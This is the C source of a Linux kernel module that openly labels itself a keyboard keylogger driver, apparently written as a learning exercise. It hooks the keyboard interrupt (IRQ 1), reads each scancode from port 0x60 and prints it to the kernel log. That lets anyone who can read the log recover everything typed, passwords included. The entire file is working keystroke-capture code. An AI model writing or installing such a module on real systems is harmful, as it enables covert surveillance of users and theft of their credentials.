#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/io.h>
#include <linux/list.h>
#include <linux/mutex.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mberengu");
MODULE_DESCRIPTION("keyboard keylogger driver");

#define IRQ_NUM 1 // dmesg | grep -i irq  => [    0.539481] serio: i8042 KBD port at 0x60,0x64 irq 1
#define IRQ_NAME "Keylogger"

struct keylogger {
	struct mutex		lock;
	struct list_head	entries;
};

struct keylogger keylogger = {
	.lock = __MUTEX_INITIALIZER(keylogger.lock),
	.entries = LIST_HEAD_INIT(keylogger.entries)
};

static irqreturn_t keyboard_isr(int irq, void *dev_id)
{
	unsigned char scancode;

	scancode = inb(0x60);
	pr_info("0x60 = |%c| - |%x|", scancode, scancode);

	return IRQ_HANDLED;
}

static int __init initialization(void)
{
	int ret;

	ret = request_irq(IRQ_NUM, keyboard_isr, IRQF_SHARED, IRQ_NAME, &keylogger);
	if (ret < 0) {
		pr_err("keylogger: could not register irq: %d\n", ret);
		return ret;
	}

	pr_info("Keylogger: irq registered\n");
	return 0;
}

static void __exit cleanup(void)
{
	free_irq(IRQ_NUM, &keylogger);
	pr_info("keylogger: irq freed\n");
}

module_init(initialization);
module_exit(cleanup);

